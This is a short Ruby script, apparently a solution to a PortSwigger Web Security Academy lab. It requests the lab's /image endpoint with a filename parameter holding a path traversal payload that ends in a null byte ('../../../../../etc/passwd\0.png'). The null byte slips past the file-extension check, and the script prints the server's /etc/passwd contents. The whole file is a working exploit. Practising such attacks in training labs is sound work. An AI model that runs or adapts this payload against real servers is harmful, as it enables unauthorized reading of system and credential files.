require 'http'

url='https://0a1700450449361181902f9b00e20074.web-security-academy.net'

path='/image'

payload = "../../../../../etc/passwd\0.png"

client = HTTP.get(url+path,:params => {:filename=>"#{payload}"})

puts client.body.to_s
